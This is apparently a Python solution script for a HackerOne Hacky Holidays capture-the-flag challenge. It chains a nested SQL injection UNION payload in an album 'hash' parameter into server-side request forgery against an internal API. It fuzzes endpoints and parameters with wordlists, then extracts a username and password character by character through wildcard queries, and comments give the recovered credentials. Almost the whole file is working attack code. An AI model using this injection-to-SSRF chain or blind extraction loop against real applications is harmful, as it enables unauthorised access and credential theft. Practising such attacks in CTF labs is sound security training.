#!/usr/bin/env python3

import re
import base64
import requests
import sys
  
BASE_URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/'
PAYLOAD = "fakehash'+UNION+SELECT+\"1337'+UNION+SELECT+0,+0,+'..\/api\/FUZZ'--+\",+'my_hash',+'my_album_name'--+"
SECLISTS_DIR = '../../../../SecLists/Discovery/Web-Content/'
CHARS = "qwertyuiopasdfghjklzxcvbnm1234567890"

def fuzz(wordlist, avoid_code='404', prefix='', suffix=''):
    with open(SECLISTS_DIR + wordlist) as payloads:
        lines = [x.strip() for x in payloads]
        for i, line in enumerate(lines):
            process(PAYLOAD.replace('FUZZ', prefix + line + suffix), avoid_code)

def process(payload, avoid_code):
    album = requests.get(BASE_URL + 'album?hash=' + payload)
    picture_data = re.match(r".*picture\?data=(.*)\"", str(album.content)).groups()[0]

    api_call = requests.get(BASE_URL + 'picture?data=' + picture_data)

    if avoid_code not in str(api_call.content):
        print(str(base64.b64decode(picture_data)))
        print(str(api_call.content))
        return True
    return False  

def exfiltrate(field):
    accumulator = ''
    while True:
        for char in CHARS:
            payload = PAYLOAD.replace('FUZZ', f'user?{field}={accumulator}{char}%')
            if process(payload, avoid_code='204'):
                accumulator += char 
    
sys.argv[1] == 'endpoints' and fuzz('common-api-endpoints-mazen160.txt', avoid_code='404') # finds endpoints "ping" and "user"
sys.argv[1] == 'parameters' and fuzz('burp-parameter-names.txt', avoid_code='400', prefix='user?', suffix='=1') # finds parameters "username" and "password"
sys.argv[1] == 'username' and exfiltrate('username') # grinchadmin
sys.argv[1] == 'password' and exfiltrate('password') # s4nt4sucks
